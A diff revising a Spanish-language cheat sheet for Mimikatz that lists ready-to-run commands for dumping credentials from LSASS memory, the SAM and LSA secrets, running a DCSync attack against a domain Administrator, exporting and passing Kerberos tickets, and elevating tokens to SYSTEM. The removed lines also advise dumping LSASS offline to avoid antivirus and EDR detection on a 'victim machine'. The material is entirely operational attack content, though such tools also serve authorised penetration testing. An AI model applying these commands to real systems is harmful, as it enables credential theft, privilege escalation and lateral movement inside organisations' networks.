@@ -1,107 +1,108 @@
 # Mimikatz Cheat Sheet
-> **Guía de referencia rápida para Mimikatz, la herramienta definitiva para extraer credenciales en texto claro, hashes NTLM, PINs y tickets Kerberos de la memoria RAM (proceso LSASS).**
+
+Comandos rápidos para la extracción de credenciales, secretos locales, tickets Kerberos y manipulación de tokens con Mimikatz.
 
 ---
 
-## 🚀 Inicio y Preparación Inicial
+## 1. Inicialización y Preparación
 
-Mimikatz requiere ejecutarse con privilegios de Administrador o SYSTEM.
+Requiere privilegios de Administrador local o SYSTEM.
 
-* **Ejecutar Mimikatz e iniciar modo interactivo**:
+* Iniciar entorno interactivo:
   ```cmd
   mimikatz.exe
   ```
-* **Habilitar privilegio de depuración (Obligatorio para interactuar con LSASS)**:
+* Habilitar privilegio de depuración (requerido para interactuar con LSASS):
   ```cmd
   mimikatz # privilege::debug
   ```
-* **Comprobar el usuario de ejecución actual en Mimikatz**:
+* Verificar identidad de ejecución actual:
   ```cmd
   mimikatz # coffee
   ```
 
 ---
 
-## 🔑 Extracción de Credenciales en Memoria (LSASS)
+## 2. Extracción de Credenciales en Memoria (LSASS)
 
-* **Volcar todas las contraseñas en memoria (texto claro, hashes NTLM, Kerberos)**:
+* Volcar credenciales de las sesiones activas (texto plano, hashes NTLM, tickets Kerberos):
   ```cmd
   mimikatz # sekurlsa::logonpasswords
   ```
-* **Extraer credenciales específicas**:
-  * **Hashes NTLM y LM**: `mimikatz # sekurlsa::msv`
-  * **Contraseñas WDigest (Texto claro en Windows antiguos o habilitadas por registro)**: `mimikatz # sekurlsa::wdigest`
-  * **Claves Kerberos y contraseñas**: `mimikatz # sekurlsa::kerberos`
-  * **Credenciales de proveedores de SSP**: `mimikatz # sekurlsa::ssp`
+* Volcar módulos de autenticación específicos:
+  * Hashes NTLM y LM: `mimikatz # sekurlsa::msv`
+  * Proveedor WDigest (texto plano si aplica): `mimikatz # sekurlsa::wdigest`
+  * Claves y tickets Kerberos: `mimikatz # sekurlsa::kerberos`
+  * Proveedores SSP: `mimikatz # sekurlsa::ssp`
 
 ---
 
-## 🗄️ Extracción de Secretos Locales y del Dominio (SAM y LSA)
+## 3. Secretos Locales y del Dominio (SAM / LSA)
 
-* **Volcar la base de datos SAM local (hashes de administradores locales)**:
+* Volcar base de datos SAM local (hashes NTLM locales):
   ```cmd
   mimikatz # lsadump::sam
   ```
-* **Volcar secretos de la LSA (contraseñas de servicios en la máquina)**:
+* Volcar secretos de la LSA (contraseñas de cuentas de servicio locales):
   ```cmd
   mimikatz # lsadump::secrets
   ```
-* **Ataque DCSync remoto (volcar hash de un usuario de dominio desde el controlador)**:
+* Ejecutar ataque DCSync remoto para obtener hash de un usuario de dominio:
   ```cmd
   mimikatz # lsadump::dcsync /user:Administrador /domain:dominio.local
   ```
 
 ---
 
-## 🎫 Gestión de Tickets Kerberos y Movimiento Lateral
+## 4. Tickets Kerberos y Movimiento Lateral
 
-* **Listar los tickets Kerberos guardados en memoria**:
+* Listar tickets Kerberos almacenados en la sesión:
   ```cmd
   mimikatz # kerberos::list
-  # O bien usando sekurlsa (extrae de todos los usuarios):
+  
+  # Alternativa (secuestro de memoria global de tickets):
   mimikatz # sekurlsa::tickets
   ```
-* **Exportar todos los tickets Kerberos en memoria a disco (archivos `.kirbi`)**:
+* Exportar todos los tickets en memoria a disco (archivos `.kirbi`):
   ```cmd
   mimikatz # sekurlsa::tickets /export
   ```
-* **Ataque Pass-the-Ticket (PTT - Cargar un ticket `.kirbi` en la sesión actual)**:
+* Cargar ticket Kerberos en la sesión actual (Pass-the-Ticket):
   ```cmd
   mimikatz # kerberos::ptt C:\Temp\ticket_administrador.kirbi
   ```
 
 ---
 
-## 🪪 Gestión de Tokens e Impersonación
+## 5. Gestión de Tokens e Impersonación
 
-Útil para asumir la identidad de un usuario con sesión abierta en la máquina.
-
-* **Listar tokens de seguridad activos**:
+* Listar tokens de seguridad disponibles en el sistema:
   ```cmd
   mimikatz # token::list
   ```
-* **Elevar privilegios al token de Administrador o SYSTEM**:
+* Impersonar el token de mayor privilegio (elevación a SYSTEM):
   ```cmd
   mimikatz # token::elevate
-  # Para volver al usuario original:
+  
+  # Revertir impersonación:
   mimikatz # token::revert
   ```
-* **Impersonar el token de un usuario específico**:
+* Impersonar token de un usuario de dominio específico:
   ```cmd
   mimikatz # token::elevate /user:Administrador
   ```
 
 ---
 
-## 🧠 Análisis Offline de Minidumps de LSASS
+## 6. Análisis Offline de Minidumps de LSASS
 
-Si ejecutas Mimikatz localmente en la máquina víctima y hay sospechas de detección (AV/EDR), puedes realizar un volcado de LSASS usando `Procdump` o `Task Manager` y leerlo en tu propia máquina atacante (Windows).
+Análisis en máquina controlada a partir de un volcado de memoria física de LSASS (evita ejecución en caliente en la víctima).
 
-1. **Cargar el archivo minidump en Mimikatz**:
+1. Cargar el minidump en Mimikatz:
    ```cmd
    mimikatz # sekurlsa::minidump lsass.dmp
    ```
-2. **Ejecutar comandos habituales (ahora se ejecutan sobre el archivo offline)**:
+2. Ejecutar comandos habituales:
    ```cmd
    mimikatz # sekurlsa::logonpasswords
    ```
